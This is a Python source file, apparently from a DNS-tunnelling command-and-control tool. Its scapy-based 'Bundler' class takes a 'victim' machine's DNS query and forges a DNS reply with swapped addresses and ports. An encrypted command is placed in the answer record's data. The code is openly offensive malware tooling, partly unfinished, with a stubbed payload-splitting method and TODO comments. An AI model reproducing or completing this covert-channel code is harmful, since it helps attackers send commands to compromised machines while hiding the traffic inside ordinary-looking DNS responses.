"""Bundles given commands into packets to be sent to the victim. 
"""
from scapy.all import *

class Bundler():

    def __init__(self, victim_packet):
        self.victim_packet = victim_packet
        self.fake_hostname = self.victim_packet.getlayer(DNSQR).qname
        self.victim_id = victim_packet.getlayer(Ether).src

    def build_command_pkt(self, encrypted_comand):
        return self._build_ether() \
                / self._build_ip() \
                / self._build_udp() \
                / self._build_dns(encrypted_comand)
    
    # TODO: Must break up large payload 
    def build_payload_pkts(self):
        pass

    def _build_packet(self):
        return self._build_ether() \
                / self._build_ip() \
                / self._build_udp() \
                / self._build_dns()

    def _build_ether(self):
        # Not sure if we need src
        ether_layer = self.victim_packet.getlayer(Ether)
        return Ether(dst=ether_layer.src, src=ether_layer.dst)

    def _build_ip(self):
        ip_layer = self.victim_packet.getlayer(IP)
        return IP(dst=ip_layer.src, src=ip_layer.dst, ttl=128, flags='', version=4)
    
    def _build_udp(self):
        udp_layer = self.victim_packet.getlayer(UDP)
        return UDP(sport=udp_layer.dport, dport=udp_layer.sport)

    def _build_dns(self, payload):
        dns_layer = self.victim_packet.getlayer(DNS)
        dnsqr_layer = self.victim_packet.getlayer(DNSQR)
        return DNS(
            qr=1, rd=1, ra=1, ancount=1, nscount=0, arcount=0,
            ns=None, ar=None,
            an = DNSRR(
                rrname=self.fake_hostname, # Update with spoof address
                type=dnsqr_layer.qtype, # Determines PING, DATA, RECPT
                rclass='IN', # Update?
                ttl=700,
                rdlen=4,
                rdata=payload # Update with payload
            )
        )